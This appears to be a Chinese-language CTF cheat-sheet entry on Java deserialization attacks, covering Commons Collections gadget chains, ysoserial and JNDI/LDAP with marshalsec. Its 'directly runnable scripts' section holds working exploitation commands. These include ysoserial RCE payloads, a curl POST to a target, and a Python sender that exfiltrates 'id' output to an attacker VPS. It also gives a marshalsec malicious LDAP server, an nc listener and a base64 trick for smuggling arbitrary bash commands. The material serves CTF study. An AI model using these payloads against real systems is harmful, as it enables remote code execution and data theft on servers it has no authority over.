---
title: Java 反序列化（CC 链 / ysoserial / JNDI）
category: web
tags: [java, 反序列化, commons-collections, ysoserial, jndi]
signals: [java 反序列化, commons-collections 依赖, readObject, base64 收到 rO0AB 开头, 字节流 deserialize 接口, 错误栈出现 InvokerTransformer, gadget chain, java 序列化流]
difficulty: hard
source: "ysoserial / PayloadsAllTheThings / 公开 writeup"
tools: [ysoserial, java, ysoserial-all, jdk8]
updated: 2026-10-22
differs_from: [web/php-deserialization.md]
---

## 一、识别信号（题面长什么样）

- 请求体/base64 解码后以 `AC ED 00 05` 开头（Java 序列化魔数），或 base64 以 `rO0AB` 开头。
- 依赖里有 `commons-collections`、`commons-beanutils`、`fastjson`、`xstream`、`hessian`。
- 错误堆栈里出现 `ObjectInputStream.readObject`、`InvokerTransformer`、`TemplatesImpl`。
- 题目给了 `.jar`、`pom.xml` 或 `dockerfile`，能看出库版本。
- 关键词：反序列化、gadget、CC1、ysoserial、JNDI、log4j。

## 二、原理

`ObjectInputStream.readObject()` 对不可信数据反序列化时，会按数据里的 `@type`/`类名` 实例化对象并调用 `readObject`。攻击者利用**已存在于 classpath 的"gadget"类**，构造一条"反序列化即执行"的调用链（POP chain）：

- **CC1（CommonsCollections 3.1～3.2.1）**：`AnnotationInvocationHandler` → `LazyMap` → `ChainedTransformer` → `Runtime.exec`。
- **CC2/CC3/CC4（Commons Collections 4）**：绕过 JDK 高版本的 `AnnotationInvocationHandler` 补丁，用 `TemplatesImpl + BadAttributeValueExpException`。
- **CommonsBeanutils**：`BeanComparator` + `TemplatesImpl`（很多 shiro 链用它）。
- 其他：`Fastjson`（`@type` + `JdbcRowSetImpl` → JNDI）、`XStream`、`Hessian`。

现代 JDK（8u191+）对 `LDAP` 远程 codebase 有防护，但 RMI + 本地 gadget（`org.apache.naming.factory.BeanFactory`）仍可打。

## 三、解题步骤

1. 确认是 Java 反序列化（魔数/入口函数）。
2. 探测依赖：盲测各条链的 payload，看哪个不报 `ClassNotFoundException`。
3. 用 `ysoserial` 生成对应链的 payload（`URLDNS` 探测连通性、`CommonsCollections*` RCE）。
4. 本地起 `nc -lvnp 4444` 接收；或写文件到 web 目录。
5. 高版本 JDK 用 `TemplatesImpl` 链（CC3/CC4/Beanutils）或 JNDI + LDAP 回连。

## 四、可直接运行的脚本

ysoserial 生成与发送：

```bash
# 下载（注意要用 JDK8 运行）
# https://github.com/frohoff/ysoserial/releases → ysoserial-all.jar

# 1) URLDNS 探测是否有反序列化（DNS 出网即可）
java -jar ysoserial-all.jar URLDNS "http://YOUR_DNS.dnslog.cn" > dns.bin

# 2) 常用 RCE 链
java -jar ysoserial-all.jar CommonsCollections1 'bash -c {echo,<base64>}|{base64,-d}|bash' > cc1.bin
java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/pwned" > cc5.bin
java -jar ysoserial-all.jar CommonsBeanutils1 "calc" > cbu.bin
java -jar ysoserial-all.jar JRMPClient "VPS:1099" > jrmp.bin

# 3) 发送（base64 场景）
base64 -w0 cc1.bin
curl -X POST "http://TARGET/api" --data-binary @cc1.bin -H "Content-Type: application/octet-stream"
```

JDK 9+ 做本地生成（因为 ysoserial 需要 JDK8，实际常用 `ysoserial-modified` 或 docker）：

```bash
docker run -it --rm -v "$PWD":/data java:8-jdk \
  sh -c "cd /data && java -jar ysoserial-all.jar CommonsCollections6 'id' > out.bin"
```

Python 侧提交（把 ysoserial 的输出 base64 后送进去）：

```python
import base64, requests, subprocess, sys

def make_payload(gadget, cmd, jar="ysoserial-all.jar"):
    raw = subprocess.check_output(["java", "-jar", jar, gadget, cmd])
    return base64.b64encode(raw).decode()

def send(url, data, cookie=None):
    h = {"Content-Type": "application/octet-stream"}
    if cookie:
        h["Cookie"] = cookie
    return requests.post(url, data=base64.b64decode(data), headers=h, timeout=10)

payload = make_payload("CommonsCollections5", "bash -c 'curl http://VPS:8000/$(id|base64)'")
print(send("http://TARGET/api/deserialize", payload).status_code)
```

JNDI 打法规避（LDAP 反连 + 本地工厂）：

```java
// 用 marshalsec 起恶意 LDAP（JDK 8u191+ 需要本地工厂绕过）
java -cp marshalsec-0.0.3-all.jar marshalsec.jndi.LDAPRefServer \
     "http://VPS:8000/#Exploit" 1389

// 目标端 payload 只需要 JNDI lookup 字符串
java -jar ysoserial-all.jar JRMPClient "VPS:1389"
```

链探测清单（盲测顺序，按成功率）：

```text
URLDNS
CommonsCollections1 / 2 / 3 / 4 / 5 / 6 / 7
CommonsBeanutils1
Hibernate1 / Hibernate2
Spring1 / Spring2
Groovy1
Jdk7u21 / Jdk8u20
Shiro（特定 key）-> 见 shiro-550-rememberme.md
```

## 五、常见坑 / 变体

- **JDK 版本与链的匹配**：`CommonsCollections1` 在 JDK 8u71+ 失效（`AnnotationInvocationHandler` 修补），改用 CC2/CC3/CC4/CC5/CC6。
- **ysoserial 要用 JDK8 运行**：JDK 11/17 下生成会因 `IllegalAccess` 失败，用 docker `java:8-jdk`。
- **`CommonsCollections` 的版本**：3.1/3.2.1 与 4.x 的链不同，`CC1` 只适用 3.x，`CC2` 适用 4.x。
- **命令执行需要空格/管道**：`bash -c {echo,BASE64}|{base64,-d}|bash` 的技巧可以将任意命令编码成无特殊字符形式。
- **DNS/HTTP 出网受限**：用 `URLDNS` 先验证；不出网时改用 `TemplatesImpl` 写文件。
- 变体：**Hessian 反序列化**（`Content-Type: x-application/hessian`）→ `hessian2` 链。
- 变体：**`XStream`**（XML 输入），`<map><entry><string>...` 格式。
- 变体：**fastjson / jackson** 的 `@type` / `@class` 注入，见 `fastjson-autotype.md`。

## 六、参考来源

- [ysoserial（frohoff）](https://github.com/frohoff/ysoserial)
- [PayloadsAllTheThings - Insecure Deserialization / Java](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [Gabriele Romaniello / CommonsCollections 链分析（ysoserial 源码）](https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads)
- [marshalsec（JNDI/LDAP 服务）](https://github.com/mbechler/marshalsec)
- [OWASP Top 10 2021 - A08:2021](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
